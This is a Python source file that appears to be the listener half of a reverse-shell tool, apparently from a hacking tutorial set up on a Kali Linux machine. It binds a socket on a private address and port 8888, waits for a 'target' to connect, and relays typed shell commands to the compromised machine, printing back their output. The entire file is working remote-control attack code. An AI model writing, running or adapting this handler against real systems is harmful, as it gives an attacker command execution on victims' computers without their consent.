import os
import socket
import json

SERVER_IP = '192.168.64.8'  # IP of my Kali Linux machine
SERVER_PORT = 8888


def reliable_send(data):
    json_data = json.dumps(data)
    target_sock.send(json_data.encode())


def reliable_recv():
    data = ''
    while True:
        try:
            data = data + target_sock.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue



def target_communication():
    while True:
        command = input(f'* Shell~{str(target_ip)}: ')
        reliable_send(command)
        if command == 'quit':
            break
        elif command[:3] == 'cd ':
            pass
        elif command == 'clear':
            os.system('clear')
        else:
            result = reliable_recv()
            print(result)


server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_sock.bind((SERVER_IP, SERVER_PORT))

print('[+] Listening For Incoming Connections')
server_sock.listen(5)
target_sock, target_ip = server_sock.accept()
print(f'[+] Target Connected From: {str(target_ip)}')

target_communication()